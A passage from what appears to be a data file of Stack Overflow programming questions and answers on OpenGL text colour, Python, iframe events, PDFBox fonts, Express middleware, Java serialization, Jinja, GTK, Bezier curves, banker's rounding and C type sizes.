    glutBitmapCharacter(GLUT_BITMAP_8_BY_13, *p);
    
    p++;
    
    contcarac++;
    return;
}

void ABACAXI()
{
    glClearColor(1.0,1.0,1.0,0.0);
    glClear(GL_COLOR_BUFFER_BIT);

    glMatrixMode(GL_PROJECTION);
    glLoadIdentity();
    glOrtho(HORIZ-60.0, HORIZ, VERTICAL-60.0, VERTICAL,1,100);

    glMatrixMode(GL_MODELVIEW);
    glLoadIdentity();
    glTranslatef(0.0, 0.0, -5.0);

    glColor3d(0.0, 1.0, 0.0);

    glBegin(GL_LINE_STRIP);
    glVertex3d(-30.0, -30.0, 0.0);
    glVertex3d(-30.0, 30.0, 0.0);
    glVertex3d(30.0, 30.0, 0.0);
    glVertex3d(30.0, -30.0, 0.0);
    glEnd();

    escritoura(escolha_de_magias);

    glFlush();
}

void teclado(int tecla, int x, int y)
{
    switch(tecla)
    {
        case GLUT_KEY_UP:
        VERTICAL++;
        break;

        case GLUT_KEY_DOWN:
        VERTICAL--;
        break;

        case GLUT_KEY_RIGHT:
        HORIZ++;
        break;

        case GLUT_KEY_LEFT:
        HORIZ--;
        break;
    }
    
    glutPostRedisplay();
}

int main(int argc, char **argv)
{
    glutInit(&argc,argv);
    glutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);
    glutInitWindowSize(1000,700);
    glutCreateWindow(""Alo!"");
    glutDisplayFunc(ABACAXI);
    glutSpecialFunc(teclado);
    glutPostRedisplay();
    glutMainLoop();
} 

I made a test with glGetFloatv(GET_CURRENT_COLOR, cor) function right before the first calling of glutBitmapCharacter() and it returned that the color of drawing is set to red.
I don't know whats happening
","The color which is use for drawing characters by glutBitmapCharacter is set by glRasterPos. glRasterPos takes the current color set by glColor and associates it. 
You have to se the the red color before glRasterPos2f, to draw a red text.
glColor3d(1.0, 0.0, 0.0);
glRasterPos2f(-28.0, position);

Your text appears in green, because the last color set before the call of glRasterPos2f, was the color for the GL_LINE_STRIP primitive.
If you want to draw a text with different colors, then you have to do multiple calls to glRasterPos at every point when the color of the text changes.

The current raster position can be get by glGetFloatv using the parameter GL_CURRENT_RASTER_POSITION:
float pos[4];
glGetFloatv( GL_CURRENT_RASTER_POSITION, pos );

Sadly you may not get the position which you have set by glRasterPos, because the coordinates which are passed to glRasterPos are transformed by the current model view matrix and projection matrix, but when you read back the position, then you will get the transformed coordinates and the coordinates are window coordinates rather than normalized device coordinates. 

If you want to change the associated color, but to keep the raster position, then you have to read the raster current position glGetFloatv(GL_CURRENT_RASTER_POSITION, ...).
This will return window coordinates.
So you have to set an orthographic projection, which transforms from window coordinates to normalized device coordinates, before glRasterPos can be called again to associate a new color. the model view matrix has to be the identity matrix.    
Change the function escritoura somehow as follows, to solve your issue: 
void escritoura (char *p)
{
    int contcarac=0, position=posicao, selecao=0;
    p++; 
    glRasterPos2f(-28.0f, position);
    while(*p)
    {
        if(*p=='1' || *p=='2' || *p=='3' || *p=='4' || *p=='5' || *p=='6' || *p=='7' || *p=='8' || *p=='9' || *p=='0')
        {
            // get the current raster position in window coordinates
            float pos[4];
            glGetFloatv( GL_CURRENT_RASTER_POSITION, pos );    

            // push model view matrix and set identity matrix
            glMatrixMode(GL_MODELVIEW);
            glPushMatrix();
            glLoadIdentity();

            // push projection matrix and set transformation form window coordinates to NDC
            glMatrixMode(GL_PROJECTION);
            glPushMatrix();
            glLoadIdentity();
            glOrtho( 0, 1000, 0, 700, -1, 1 ); // (1000, 700) is the window size!

            // change current color
            glColor3d( 1.0, 0.0, 0.0 );

            // associate new color, but keep position
            glRasterPos4fv( pos );

            // restore (pop) model view and projection matrix
            glMatrixMode(GL_PROJECTION);
            glPopMatrix();
            glMatrixMode(GL_MODELVIEW);
            glPopMatrix();
        }
        glutBitmapCharacter(GLUT_BITMAP_8_BY_13, *p);
        p++; contcarac++;
    }
    return;
}

",c
why does python keep evaluating code after pass,"I found an interesting piece of code in python:
def x(cond):
    if cond:
        pass
        print('Still running!')

x(True)

I would expect this not to print anything, but it prints Still running!. What is happening here?
","As per Python docs:

pass is a null operation — when it is executed, nothing happens.

Source - https://docs.python.org/3/reference/simple_stmts.html#pass
As such, pass does not do anything and all statements after pass will still be executed.
Another way of thinking about this is that pass is equivalent to any dummy statement:
def x(cond):
    if cond:
        ""dummy statement""
        print('Still running!')

",python
eventlistener won39t work in iframe but works outside of it,"<html lang=""en"">
<head>
  <meta charset=""utf-8"">

</head>

<body>


      <iframe id = ""iframe"" src = ""https://cdn.shopify.com/s/files/1/2656/8500/products/starlight-stars-navy-blue-gold-wallpaper-m1490.jpg?v=1554116082""></iframe>


</body>

^HTML
<script src=""https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js""></script>

<script>

//detect print screen windows
window.addEventListener(""keyup"", function(e) {
  if (e.keyCode == 44) {
    alert(""printed"");
    

  }
});


$(""#iframe"").keyup(function(e) {
  if (e.keyCode == 44) {
    alert(""printed"");
    

  }
});

</script>

The alert pops up when you press prnt screen but if you click on the iframe and press prntscreen, it doesn't pop up. Where am I going wrong here?
","If it's a cross-origin <iframe> to a page on a website you don't control then there is nothing you can do to listen to DOM events raised inside an <iframe> element. This is for security reasons, to paraphrase my upvoted comment from earlier:

Scripts in a cross-domain <iframe> cannot cross the <iframe> boundary for obvious security reasons. Imagine if I loaded your bank's website into an <iframe> on my website that you opened: I could use keyup events raised by your bank's website that are listened-to by my host-page to record your online banking passwords and more.

If it's a same-origin <iframe> (and a page you control) then the best way is to use postMessage to allow an iframe to communicate, like so:

loadedIntoIFrame.html
In your page (which is loaded into an iframe) you need to use postMessage to send a message to another frame or iframe.
Note that postMessage can be used between cross-domain webpages. However it is an opt-in system: unlike with same-origin iframes where the host page's scripts have full and direct access to the iframe's document's DOM, postMessage requires the other page to agree to handle
<head>
    <!-- [...] --->

    <script>
if( window.parent ) {
    document.addEventListener( 'keyup', onDocumentKeyUpPostMessageToParent );
}

function onDocumentKeyUpPostMessageToParent( e ) {
    if( e.isComposing || e.keyCode === 229 ) return; // Skip IME events.

    document.getElementById( 'thisPageKeyCode' ).textContent = e.keyCode.toString();

    const msg = {
        keyCode: e.keyCode
    };   

    const targetOrigin = 'http://localhost'; // This MUST exactly match the origin of the <iframe>'s host-page (note that an ""Origin"" is *NOT* the page's full URI).

    window.parent.postMessage( msg, targetOrigin );
}
    </script>
</head>
<body>

    <p>this is the iframe content page</p>

    <p>last <code>keyup</code> event in this page: <span id=""thisPageKeyCode""></span></p>

</body>

hostPage.html
In your host page, set-up a listener for postMessage events:
<head>
    <!-- [...] --->

    <script>
window.addEventListener( 'message', onMessageReceived );

function onMessageReceived( e ) {

    const msg = e.data;  // `e.data` is the same as the `msg` object in the iframe page's script.
    const keyCode = msg.keyCode;

    document.getElementById( 'lastIFrameKeyCode' ).textContent = keyCode.toString();
}
    </script>
</head>
<body>

    <p>this is the iframe host page</p>

    <p>last <code>keyup</code> event in iframe: <span id=""lastIFrameKeyCode""></span></p>

    <iframe style=""border: 3px inset #ccc;"" src=""loadedIntoIFrame.html""></iframe>
   
</body>



JSFiddle example
Here is a JSFiddle example showing iframe communication with postMessage:
https://jsfiddle.net/daiplusplus/n0bpedxa/11/
Note:

The JSFiddle for the host page is https://jsfiddle.net/daiplusplus/n0bpedxa/11/
The JSFiddle for the content of the iframe is here: https://jsfiddle.net/daiplusplus/uzrmj49n/7/
The the actual origin of these iframes (as of Q3 2020) is https://fiddle.jshell.net.

This will need to be updated if JSFiddle ever change their Origin value.



Screenshot proof:

",javascript
rendering emojis using pdfbox does not work,"I attempted to render emojis using the emoji-supported font Noto Color Emoji (https://fonts.google.com/noto/specimen/Noto+Color+Emoji) with the PDFBox 3.0.3 Java library. However, the font.hasGlyph(codePoint) method consistently returns false for all codepoint availability checks. Despite this, the emojis in question are clearly supported by the specified Google font. I have included the code below. Could someone kindly guide me in identifying the cause of this issue?
import org.apache.pdfbox.pdmodel.PDPage;
import org.apache.pdfbox.pdmodel.PDPageContentStream;
import org.apache.pdfbox.pdmodel.font.PDType0Font;

import java.io.File;
import java.io.IOException;

public class EmojiPdfExample {
    public static void main(String[] args) {
        try (PDDocument doc = new PDDocument()) {

            File fontFile = new File(""NotoColorEmoji-Regular.ttf"");
            var font = PDType0Font.load(doc, fontFile);

            // Add a page
            PDPage page = new PDPage();
            doc.addPage(page);

            try (PDPageContentStream cs = new PDPageContentStream(doc, page)) {
                cs.beginText();
                cs.setFont(font, 20);
                cs.newLineAtOffset(50, 700);

                // Emoji string
                String text = ""\uD83D\uDE00 \uD83D\uDE09"";

                for (int i = 0; i < text.length(); ) {
                    int codePoint = Character.codePointAt(text, i);
                    i += Character.charCount(codePoint);

                    String glyph;
                    try {
                        glyph = new String(Character.toChars(codePoint));
                    } catch (IllegalArgumentException e) {
                        System.err.println(""Invalid code point: U+"" + Integer.toHexString(codePoint));
                        continue; // Skip invalid code points
                    }

                    try {
                        if (font.hasGlyph(codePoint)) {
                            cs.showText(glyph);
                        } else {
                            // Handle unsupported glyphs 
                            System.out.println(""Unsupported glyph,"" + glyph);
                        }
                    } catch (IOException e) {
                        System.err.println(""IOException while showing glyph: U+"" + Integer.toHexString(codePoint));
                    }
                }
                cs.endText();
            }

            doc.save(""emojis.pdf"");
            System.out.println(""PDF created: emojis.pdf"");

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

","tl;dr: use a different font and simpler javacode.
I tried your code but failed initially... emojis usually don't work. Then I tried this:
String text = new String(Character.toChars(0x1f600));

because \uD83D\uDE00 is really unicode U+1f600. However this didn't work either. A look at the font with DTL OTMaster 3.7 light shows that the code in the PDF (2386) is correct because that one does have unicode 1f600, however no glyph.

Same when doing
text = ""😀 😉"";

I then tried a different font that I found while researching, ""Symbola"", and I got this:

It works both with using the emojis directly or using your original line with ""\uD83D\uDE00 \uD83D\uDE09"". However the long java segment where you're breaking this into codepoints doesn't work, probably because font.hasGlyph() doesn't work the way you expect. The javadoc mentions that the ""code"" parameter isn't unicode but that's what you're passing. It's better to catch the IllegalArgumentException like done in the EmbeddedMultipleFonts example.
Oh, if you were expecting this to appear in color like in your browser: that isn't supported. That's not part of the original truetype specification.
",java
how to name an anonymous function or a express middleware in javascript,"Here's the middleware that I use in express:

    const app = express();
    const port = 8000;
    const f = () => {
        return async (req, res, next) => {
            await new Promise(resolve => setTimeout(resolve, 3000));
            return next();
        }
    }
    const namedFunction = f();
    app.use(namedFunction); // earlier I was using `app.use(f());` 

But my function still appear as anonymous function in profiler:
Something like this:

A bit of background:
We want to see which middleware is causing the high latency, but because the middlewares are anonymous, we can't narrow down the cause in our APM + JS profiler. The preceding is just one example; we use approximately 40 middleware packages over which we have no control.
That's why I thought passing f() to namedFunction should fix the issue but it wasn't so looking for help on this.
Other tries till now:
As per Jonsharpe's comment I tried:
app.use(function namedFunction() { f()(...arguments) });

But in profiler it still appear as an anonymous function
","After a lot many tries of assigning name, refactoring use I came up with this and finally the profiler was able to point out that it's the wrappedFunction which is causing it so going ahead I'll need to create a wrapperFunction for each of the case.
Here's a sample of what worked in the end:
const f = () => {
        return async (req, res, next) => {
            await new Promise(resolve => setTimeout(resolve, 3000));
            return next();
        }
    }
    const wrappedFunction  = async(req, res, next) => {
        await new Promise(resolve => f()(req, res, resolve)); // Now since time is spent in this block that's why profiler is picking this up instead of the anonymous function as the main resource consuming function
        next();
    }
    
    app.use(wrappedFunction);

And here's what it looks like in profiler now:

Just an note to others who might not know the context:
By default the official middlewares are usually named functions but some 3rd party middleware return an anonymous function which profiler/APM isn't able to pick up and point to code block from there.
That's why it's important to have a named function instead of anonymous middleware showing up in UI and being unclear where to look at.
",javascript
how to dump a hashset into a file in java,"One of my program reads a file and does some processing and builds an in-memory hash set. I would like to store this built hash set as such in a file, so that another program can read it off later on as such and take the whole image in its in-memory data structure hash set. How to achieve this?
","Have a look at serialization.
Here's an example:
String filename = ""savedHashSet.dat"";

// Create it
Set<String> someStrings = new HashSet<String>();
someStrings.add(""hello"");
someStrings.add(""world"");

// Serialize / save it
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename));
oos.writeObject(someStrings);

...
...
...

// Deserialize / load it
ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
Set<String> aNewSet = (HashSet<String>) ois.readObject();

Related links:

Java Serialization Tutorial
The Java™ Tutorials: Serializable Objects (from Oracle)


Note that the objects you store in the HashSet needs to be serializable too. Personally, I usually rely on ""manual"" serialization. If for instance your HashSet contains primitive types, Strings, or lists of Strings or something else which is easy enough to ""manually"" write to disk, I'd probably consider doing that.
",java
jinja templating with recursive in dict doesn39t works,"I'm stuck in a Jinja implementation problem.
Here is my little python script:
path = Path(__file__).parent

env = Environment(
    loader=FileSystemLoader(path / ""templates"")
)
template = env.get_template(""template1.rst"")

rendered = template.render(sample={""a"": {""b"": ""c""}})

And here is my template for jinja:
.. toctree::
   :maxdepth: 3

{% for k, v in sample.items() recursive %}
- {{ k }}:

  {%- if v is string %}
    {{ v }}

  {%- else %}
    {{ loop(v) }}
  
  {%- endif -%}

{%endfor%}

The execution returns this error:
File ""/home/jaja/Bureau/coding/bac_a_sable/sphinx_test/templates/template1.rst"", line 5, in top-level template code
    {% for k, v in sample.items() recursive %}
    ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/jaja/Bureau/coding/bac_a_sable/sphinx_test/templates/template1.rst"", line 21, in template
    {{ loop(v) }}
^^^^^^^^^^^^^^^^^^
  File ""/home/jaja/Bureau/coding/bac_a_sable/sphinx_test/templates/template1.rst"", line 5, in template
    {% for k, v in sample.items() recursive %}
    ^^^^^^^^^^^^^^^^^^^^^^^^^
ValueError: not enough values to unpack (expected 2, got 1)

As the v value of first loop is {""b"": ""c""}, it must work, but it doesn't.
Is Jinja unable to recursively loop in dictionaries ?
","immediate fix
When you start the loop, you use sample.items() iterator -
{% for k, v in sample.items() recursive %}
               ^^^^^^^^^^^^^^

When you recur, you are passing the dict itself -
  {%- else %}
    {{ loop(v) }}
            ^

Simply change this to -
  {%- else %}
    {{ loop(v.items()) }}
            ^^^^^^^^^


naive test
An improvement to the entire loop would be to change the test to mapping, instead of string.
{% for k, v in sample.items() recursive %}
- {{ k }}:

  {%- if v is mapping %}
    {{ loop(v.items()) }}

  {%- else %}
    {{ v }}
  
  {%- endif -%}

{%endfor%}

This ensures that you only recur on dicts. In the original code, the else will recur any non-string input. If the data included a number, you would've encountered a different error.

nested input, nested output
Preserving the levels of nesting in the output can be challenging. Consider using the loop.depth helper to create the correct whitespace -
{% for k, v in sample.items() recursive %}
{{ ""  "" * (loop.depth - 1) }}- {{ k }}: 
  {%- if v is mapping %} {{- loop(v.items()) }}
  {%- else %} {{ v }}
  {%- endif -%}
{%endfor%}

Given sample input -
sample = {
  'a': {
    'b': 1,
    'c': { 'd': 2 },
    'e': 'f',
  },
}

Output
- a: 
  - c: 
    - d: 2
  - b: 1
  - e: f

",python
java 16 in eclipse ide,"I am unable to change the compiler to Java SE 1.6 in Eclipse as the option is not shown in the change compiler menu.
When I try to look for it in the compiler options, it cannot be found:

When I select it from the ""Execution Environments"", the application just closes automatically and the compiler still shows 23.
","Java 6 has been released in 2006, there are no public updates for these JDKs any more and people aren't really using it any more. Even javac only supports compiling Java 8 or higher with more recent JDKs. If someone is still using JDK 6 in production, they should (probably) have updated years ago.
This resulted in Eclipse dropping support for compiling for Java 7 and below in Eclipse 2024-09. You can find the release notes here.
When writing Java code, you likely want to use the latest LTS version which is 21 at the moment unless you have a very good reason to use an older version. If you want to use Java 8 for example, you can still do that with the latest Eclipse versions.
If you really want to write code for Java 6, you can use Eclipse 2024-06.
",java
generating a list of radio buttons in gtk3 c,"I'm trying my hand at GTK UI and need help with the following problem ; I couldn't find too much material about it online.
Using GTK 3, in the C language and on Linux, I am trying to generate a UI list of radio buttons that would all belong to the same group.
I thought this would work:
void make_projects_list(GtkWidget *projects_grid)
    {
    int n = 20;
        
    GSList *group;
    for (int i =0; i<n; i++)
        {

        GtkWidget *radio;
        char label[3];
        snprintf(label, 3, ""%d"", i);
        if (i==0)
        {   
            radio = gtk_radio_button_new_with_label(NULL, label);
            group = gtk_radio_button_get_group(GTK_RADIO_BUTTON(radio));
        }
        else
        { 
            radio = gtk_radio_button_new_with_label(group, label);
        }

        gtk_grid_insert_row(GTK_GRID(projects_grid), i);
        gtk_grid_attach(GTK_GRID(projects_grid), radio, 1, i, 1,1); 

        }
    }

If the radio button is the first to be created, I summon it with ""NULL"" as a first parameter so that GTK creates a group for it, then all the other buttons would get assigned to that group.
However when I run this code along with the rest of my program none of the buttons seem to belong to the same group, as they're almost all toggleable independently of one another, except for button 0, with remains toggled even when I click it.
Would appreciate any help since I'm obviously missing something. All the examples I could find online create a distinct variable for every radio button so I'm wondering if what I'm trying to achieve is even possible.
Here's a sample to reproduce (the window it spawns is tiny by fault but you can expand it)

#include<gtk/gtk.h>
#include<stdio.h>

void make_projects_list(GtkWidget *projects_grid)
    {
    int n = 20;

    GSList *group;
    for (int i =0; i<n; i++)
        {

        GtkWidget *radio;
        char label[3];
        snprintf(label, 3, ""%d"", i);
        if (i==0)
        {
            radio = gtk_radio_button_new_with_label(NULL, label);
            group = gtk_radio_button_get_group(GTK_RADIO_BUTTON(radio));
        }
        else
        {
            radio = gtk_radio_button_new_with_label(group, label);
        }

        gtk_grid_insert_row(GTK_GRID(projects_grid), i);
        gtk_grid_attach(GTK_GRID(projects_grid), radio, 1, i, 1,1);

        }
    }


int main(int argc, char *argv[])
    {
    GtkBuilder *builder;

    GtkWidget *window;  
    GtkWidget *grid;

    GError *error = NULL;
    gtk_init(&argc, &argv);
    

    builder = gtk_builder_new();
    if (gtk_builder_add_from_file(builder, ""build.ui"", &error) == 0)
    {
        g_printerr(""Error loading file: %s\n"", error->message);
        g_clear_error(&error);
        return 1;
    }
    
    window = GTK_WIDGET (gtk_builder_get_object(builder, ""window""));
    grid = GTK_WIDGET (gtk_builder_get_object(builder, ""grid""));

    gtk_builder_connect_signals(builder, NULL);

    make_projects_list(grid);

    gtk_widget_show_all(window);

    gtk_main();
    
    return 0;
    }



build.ui:

<?xml version=""1.0"" encoding=""UTF-8""?>
<!-- Generated with glade 3.40.0 -->
<interface>
  <requires lib=""gtk+"" version=""3.24""/>
  <object class=""GtkWindow"" id=""window"">
    <property name=""can-focus"">False</property>
    <child>
      <object class=""GtkScrolledWindow"" id=""scrolled_window"">
        <property name=""visible"">True</property>
        <property name=""can-focus"">True</property>
        <property name=""shadow-type"">in</property>
        <child>
          <object class=""GtkViewport"" id=""viewport"">
            <property name=""visible"">True</property>
            <property name=""can-focus"">False</property>
            <child>
              <!-- n-columns=1 n-rows=1 -->
              <object class=""GtkGrid"" id=""grid"">
                <property name=""visible"">True</property>
                <property name=""can-focus"">False</property>
                <child>
                  <placeholder/>
                </child>
              </object>
            </child>
          </object>
        </child>
      </object>
    </child>
  </object>
</interface>



I am aware I should not use Glade. In this precise context I have elected to use it as a shortcut as I need to get this particular application done in a timely manner for school.
","When using the new radio button interfaces that use the group, the group must be re-fetched each time so that the group list is correct.  The old group list is no longer valid after another radio button is added to the group.  Your updated code looks like:
void make_projects_list(GtkWidget *projects_grid)
    {
    int n = 20;

    GSList *group = NULL;
    for (int i =0; i<n; i++)
        {

        GtkWidget *radio;
        char label[3];
        snprintf(label, 3, ""%d"", i);
        radio = gtk_radio_button_new_with_label(group, label);
        group = gtk_radio_button_get_group(GTK_RADIO_BUTTON(radio));

        gtk_toggle_button_set_active (GTK_TOGGLE_BUTTON (radio), i==0?1:0);
        gtk_grid_insert_row(GTK_GRID(projects_grid), i);
        gtk_grid_attach(GTK_GRID(projects_grid), radio, 1, i, 1,1);
        }
    }

",c
finding a point and its angle on a cubic bezier curve in javascript,"I need to find a point and its angle on a cubic Bezier curve that can be dynamically changed using JavaScript.
I asked ChatGPT about this, to which it generated the following code, but the angle is not calculated correctly, where am I or is ChatGPT wrong?
      // Initialize with some initial control points
      let points = [
        { x: 50, y: 100 }, // Start point
        { x: 150, y: 50 }, // First control point
        { x: 250, y: 150 }, // Second control point
        { x: 350, y: 100 } // End point
      ];

      function deCasteljau(points, t) {
        if (points.length === 1) {
          return points[0];
        }

        const newPoints = [];
        for (let i = 0; i < points.length - 1; i++) {
          const x = (1 - t) * points[i].x + t * points[i + 1].x;
          const y = (1 - t) * points[i].y + t * points[i + 1].y;
          newPoints.push({ x, y });
        }

        return deCasteljau(newPoints, t);
      }

      function cubicBezierDerivative(points, t) {
        const derivativePoints = [];
        const n = points.length - 1;
        for (let i = 0; i < n; i++) {
            const dx = n * (points[i + 1].x - points[i].x);
            const dy = n * (points[i + 1].y - points[i].y);
            derivativePoints.push({ x: dx, y: dy });
        }
        return derivativePoints;
      }


      function bezierAngle(points, t) {
        const dPoints = cubicBezierDerivative(points, t);
        const point = deCasteljau(points, t);
        const dx = dPoints[0].x;
        const dy = dPoints[0].y;
        const radian = Math.atan2(dy, dx);
        //const angle = radian*180/Math.PI;
        return radian;
      }
      const point = deCasteljau(points, 0.9);
          
      const angle = bezierAngle(points, 0.9);



live demo:


const canvas = document.getElementById('splineCanvas');
const ctx = canvas.getContext('2d');

let points = []; // Array to hold control points
let selectedPointIndex = -1; // Index of the currently selected control point

// Event listener for mouse down to select control point
canvas.addEventListener('mousedown', function(event) {
    const rect = canvas.getBoundingClientRect();
    const mouseX = event.clientX - rect.left;
    const mouseY = event.clientY - rect.top;

    // Check if mouse is over any control point
    for (let i = 0; i < points.length; i++) {
        const dx = points[i].x - mouseX;
        const dy = points[i].y - mouseY;
        const dist = Math.sqrt(dx * dx + dy * dy);
        if (dist < 6) { // 6 is the radius for selecting control point
            selectedPointIndex = i;
            canvas.addEventListener('mousemove', onMouseMove);
            canvas.addEventListener('mouseup', onMouseUp);
            break;
        }
    }
});

// Event listener for mouse move to update control point position
function onMouseMove(event) {
    const rect = canvas.getBoundingClientRect();
    const mouseX = event.clientX - rect.left;
    const mouseY = event.clientY - rect.top;

    points[selectedPointIndex].x = mouseX;
    points[selectedPointIndex].y = mouseY;
    drawSpline();
}

// Event listener for mouse up to stop updating control point position
function onMouseUp() {
    canvas.removeEventListener('mousemove', onMouseMove);
    canvas.removeEventListener('mouseup', onMouseUp);
    selectedPointIndex = -1;
}

let testAngle = 65;

// Draw spline function
function drawSpline() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.beginPath();
    ctx.moveTo(points[0].x, points[0].y);

    for (let i = 1; i < points.length - 2; i+=3) {
        ctx.bezierCurveTo(
          points[i].x, 
          points[i].y,
          points[i+1].x,
          points[i+1].y,
          points[i+2].x,
          points[i+2].y,
        );
    }

    ctx.stroke();

    // Draw control points
    for (const point of points) {
        ctx.beginPath();
        ctx.arc(point.x, point.y, 6, 0, Math.PI * 2);
        ctx.fillStyle = ""#ff0000"";
        ctx.fill();
        ctx.closePath();
    }

    const point = deCasteljau(points, 0.9);
    //console.log('point = ', point);
    const angle = bezierAngle(points, 0.9);
    ctx.save();
    ctx.translate(point.x, point.y);
    ctx.rotate(angle);
    ctx.translate(-point.x, -point.y);

    ctx.fillStyle = ""green"";
    ctx.fillRect(point.x-5, point.y-5, 10, 10);
    ctx.restore();
}

// Initialize with some initial control points
points = [
  { x: 50, y: 100 }, // Start point
  { x: 150, y: 50 }, // First control point
  { x: 250, y: 150 }, // Second control point
  { x: 350, y: 100 } // End point
];

function deCasteljau(points, t) {
  if (points.length === 1) {
    return points[0];
  }

  const newPoints = [];
  for (let i = 0; i < points.length - 1; i++) {
    const x = (1 - t) * points[i].x + t * points[i + 1].x;
    const y = (1 - t) * points[i].y + t * points[i + 1].y;
    newPoints.push({ x, y });
  }

  return deCasteljau(newPoints, t);
}

function cubicBezierDerivative(points, t) {
  const derivativePoints = [];
  const n = points.length - 1;
  for (let i = 0; i < n; i++) {
      const dx = n * (points[i + 1].x - points[i].x);
      const dy = n * (points[i + 1].y - points[i].y);
      derivativePoints.push({ x: dx, y: dy });
  }
  return derivativePoints;
}


function bezierAngle(points, t) {
  const dPoints = cubicBezierDerivative(points, t);
  const point = deCasteljau(points, t);
  const dx = dPoints[0].x;
  const dy = dPoints[0].y;
  const radian = Math.atan2(dy, dx);
  //const angle = radian*180/Math.PI;
  return radian;
}

drawSpline();
<canvas id=""splineCanvas"" width=""600"" height=""300""></canvas>



","Just from a math perspective I question what you mean by ""finding a point and its angle"" points in 2D space, like you represented in the points array, are just {x, y} there is no angle ...

What we can do is calculate the angle between two points, and looks like that is what the functions cubicBezierDerivative & bezierAngle attempted to do, I'm assuming that is what you need/ask, I would base my code below on that, also I'm going to assume that the point returned by function deCasteljau is correct, I'm not going to spend any research time into how is that doing what is doing.
So we can modify the function bezierAngle to return the angle between two given points, the current point and and what I call ""next"" point:
    const point = deCasteljau(points, x);
    const next = deCasteljau(points, x + 0.01);
    const angle = bezierAngle([point, next]);

with the angle between those two the square we draw is ""facing"" the right way.
In the code below you will see a new function drawRect that is where we draw the squares, and since it is now a function we can have multiple square with different colors


const canvas = document.getElementById('splineCanvas');
const ctx = canvas.getContext('2d');

let points = [
  { x: 50,  y: 100 }, // Start point
  { x: 170, y: 20  }, // First control point
  { x: 240, y: 170 }, // Second control point
  { x: 350, y: 10  }  // End point
]
let selectedPointIndex = -1;

// Event listener for mouse down to select control point
canvas.addEventListener('mousedown', function(event) {
    const rect = canvas.getBoundingClientRect();
    const mouseX = event.clientX - rect.left;
    const mouseY = event.clientY - rect.top;

    // Check if mouse is over any control point
    for (let i = 0; i < points.length; i++) {
        const dx = points[i].x - mouseX;
        const dy = points[i].y - mouseY;
        const dist = Math.sqrt(dx * dx + dy * dy);
        if (dist < 6) { // 6 is the radius for selecting control point
            selectedPointIndex = i;
            canvas.addEventListener('mousemove', onMouseMove);
            canvas.addEventListener('mouseup', onMouseUp);
            break;
        }
    }
});

// Event listener for mouse move to update control point position
function onMouseMove(event) {
    const rect = canvas.getBoundingClientRect();
    const mouseX = event.clientX - rect.left;
    const mouseY = event.clientY - rect.top;

    points[selectedPointIndex].x = mouseX;
    points[selectedPointIndex].y = mouseY;
    drawSpline();
}

// Event listener for mouse up to stop updating control point position
function onMouseUp() {
    canvas.removeEventListener('mousemove', onMouseMove);
    canvas.removeEventListener('mouseup', onMouseUp);
    selectedPointIndex = -1;
}

let testAngle = 65;

// Draw spline function
function drawSpline() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.beginPath();
    ctx.moveTo(points[0].x, points[0].y);

    ctx.bezierCurveTo(
      points[1].x, points[1].y,
      points[2].x, points[2].y,
      points[3].x, points[3].y,
    );
    ctx.stroke();

    // Draw control points
    for (const point of points) {
        ctx.beginPath();
        ctx.arc(point.x, point.y, 6, 0, Math.PI * 2);
        ctx.fillStyle = ""#ff0000"";
        ctx.fill();
        ctx.closePath();
    }
   drawRect(0.2, ""cyan"")
   drawRect(0.5, ""blue"")
   drawRect(0.8, ""green"")
}

function drawRect(x, color) {
    const point = deCasteljau(points, x);
    const next = deCasteljau(points, x + 0.01);
    const angle = bezierAngle([point, next]);
    ctx.save();
    ctx.globalAlpha = 0.6
    ctx.translate(point.x, point.y);
    ctx.rotate(angle);
    ctx.translate(-point.x, -point.y);

    ctx.fillStyle = color;
    ctx.fillRect(point.x-15, point.y-15, 30, 30);
    //ctx.fillStyle = ""black"";
    //ctx.fillText(angle, point.x, point.y);
    ctx.restore();
}

function deCasteljau(points, t) {
  if (points.length === 1) {
    return points[0];
  }

  const newPoints = [];
  for (let i = 0; i < points.length - 1; i++) {
    const x = (1 - t) * points[i].x + t * points[i + 1].x;
    const y = (1 - t) * points[i].y + t * points[i + 1].y;
    newPoints.push({ x, y });
  }

  return deCasteljau(newPoints, t);
}

function bezierAngle(points) {
  const dx = points[1].x - points[0].x;
  const dy = points[1].y - points[0].y;
  const radian = Math.atan2(dy, dx);
  return radian;
}

drawSpline();
<canvas id=""splineCanvas"" width=""400"" height=""180""></canvas>



",javascript
gaussianbanker39s rounding in javascript,"I have been using Math.Round(myNumber, MidpointRounding.ToEven) in C# to do my server-side rounding, however, the user needs to know 'live' what the result of the server-side operation will be which means (avoiding an Ajax request) creating a JavaScript method to replicate the MidpointRounding.ToEven method used by C#.
MidpointRounding.ToEven is Gaussian/banker's rounding, a very common rounding method for accounting systems described here.
Does anyone have any experience with this? I have found examples online, but they do not round to a given number of decimal places...
","function evenRound(num, decimalPlaces) {
    var d = decimalPlaces || 0;
    var m = Math.pow(10, d);
    var n = +(d ? num * m : num).toFixed(8); // Avoid rounding errors
    var i = Math.floor(n), f = n - i;
    var e = 1e-8; // Allow for rounding errors in f
    var r = (f > 0.5 - e && f < 0.5 + e) ?
                ((i % 2 == 0) ? i : i + 1) : Math.round(n);
    return d ? r / m : r;
}

console.log( evenRound(1.5) ); // 2
console.log( evenRound(2.5) ); // 2
console.log( evenRound(1.535, 2) ); // 1.54
console.log( evenRound(1.525, 2) ); // 1.52

Live demo: http://jsfiddle.net/NbvBp/
For what looks like a more rigorous treatment of this (I've never used it), you could try this BigNumber implementation.
",javascript
size of ints and longs,"I wrote this code:
#include <stdio.h>
int main(){

        printf(""Size of short int: %d \n"", sizeof(short));
        printf(""Size of int: %d \n"", sizeof(int));
        printf(""Size of long int: %d \n"", sizeof(long));
        printf(""Size of float: %d \n"", sizeof(float));
        printf(""Size of double: %d \n"", sizeof(double));
        printf(""Size of long double: %d \n"", sizeof(long double));



    return 0;
}    

Where the output was:
Size of short int: 2
Size of int: 4
Size of long int: 4
Size of float: 4
Size of double: 8
Size of long double: 12

Naturally, there are differences between integers and floating point data types, but what is the reason behind any compiler allocating the same amount of memory to a long as it does to an int? The long was designed to handle larger values, but is put to no use if done like the above(for the case of the integer). The floating point long variety adds an additional 16 bits of allocation.
